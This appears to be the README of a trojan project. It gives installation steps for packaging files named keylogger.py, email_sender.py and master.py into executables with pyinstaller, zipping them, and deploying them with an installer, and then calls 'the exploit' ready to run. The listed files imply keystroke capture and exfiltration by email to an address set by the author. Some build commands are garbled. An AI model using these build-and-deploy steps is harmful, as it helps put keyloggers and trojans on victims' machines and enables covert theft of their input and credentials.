this is a trojan project that i am constantly developing if a new version comes out it has been tested by me and should therefore be stable

INSTALLATION:
The installation must be done on windows!
The paths and addresses(IP) have to be adjusted in the "keylogger.py","email_sender.py" and "master.py"!
1. pip install pip install pyinstaller
2. python --onefile [master.py]
3. the exported exe file must be zipped to master.zip
4. python --onefile [installer.py]
5. copy the installer.exe and copy it into a folder with the master.zip
now the exploit is ready to be executed
if errors occur during execution a pip install --upgrade 'setuptools<45.0.0'   help
